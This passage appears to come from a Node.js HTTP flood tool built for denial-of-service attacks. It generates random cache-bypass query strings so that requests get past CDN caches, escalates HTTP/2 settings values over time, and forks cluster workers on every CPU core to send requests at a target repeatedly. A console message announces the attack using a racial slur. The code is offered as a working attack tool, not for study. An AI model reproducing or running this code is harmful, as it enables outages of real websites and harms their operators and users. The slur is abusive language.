        return url.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    return url.pathname;
}

function generateCacheQuery() {
    const cacheBypassQueries = [
        `?v=${Math.floor(Math.random() * 1000000)}`,
        `?_=${Date.now()}`,
        `?cachebypass=${randstr(8)}`,
        `?ts=${Date.now()}_${randstr(4)}`,
        `?cb=${crypto.randomBytes(4).toString('hex')}`,
        `?rnd=${generateRandomString(5, 10)}`,
        `?param1=${randstr(4)}&param2=${crypto.randomBytes(4).toString('hex')}&rnd=${generateRandomString(3, 8)}`,
        `?cb=${randstr(6)}&ts=${Date.now()}&extra=${randstr(5)}`,
        `?v=${encodeURIComponent(randstr(8))}&cb=${Date.now()}`,
        `?param=${randstr(5)}&extra=${crypto.randomBytes(8).toString('base64')}`,
        `?ts=${Date.now()}&rnd=${generateRandomString(10, 20)}&hash=${crypto.createHash('md5').update(randstr(10)).digest('hex').slice(0,8)}`
    ];
    return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;

        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`BUM BUM HTTPS-FROZEN SENT TO NIGGA TARGET`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            let totalConnections = 0;
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (code !== 'rawConnections') {
                                if (statuses[code] == null)
                                    statuses[code] = 0;
                                statuses[code] += st[code];
                            }
                        }
                        totalConnections += st.rawConnections || 0;
                    }
                }
            }
            const statusString = Object.entries(statuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            console.clear();
            console.log(`[${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Codes: [${statusString}]`);
            rawConnections = 0;
        }, 1000);
    }

    setInterval(() => {
    }, 1100);

    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
} else {
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 50000) {
                consssas++;
            } else {
                clearInterval(someee);
                return;
            }
            go();
        }, delay);
    }
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift();

            statusesQ.push({ ...statuses, rawConnections });
            statuses = {};
            rawConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
